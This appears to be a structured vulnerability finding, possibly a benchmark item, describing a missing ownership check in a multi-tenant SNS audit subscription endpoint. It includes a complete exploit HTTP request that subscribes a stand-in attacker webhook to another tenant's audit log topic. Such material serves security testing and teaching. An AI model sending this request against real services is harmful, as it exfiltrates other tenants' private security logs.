diagnosis: The SNS audit monitoring subscription handler registers an external HTTPS webhook against arbitrary tenantTopicArn values supplied in the request body. It does not verify that the authenticated tenant owns the SNS topic. An attacker can subscribe their own external endpoint to receive private audit and security event notifications from any other tenant's SNS topic.
exploit_request:
POST /api/monitoring/sns/subscribe-audit HTTP/1.1
Host: audit-collector.cloud.internal:3006
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{
  "tenantTopicArn": "arn:aws:sns:us-east-1:123456789012:tenant-fintech-audit-logs",
  "webhookEndpointUrl": "https://attacker-webhook.io/sniff-logs"
}
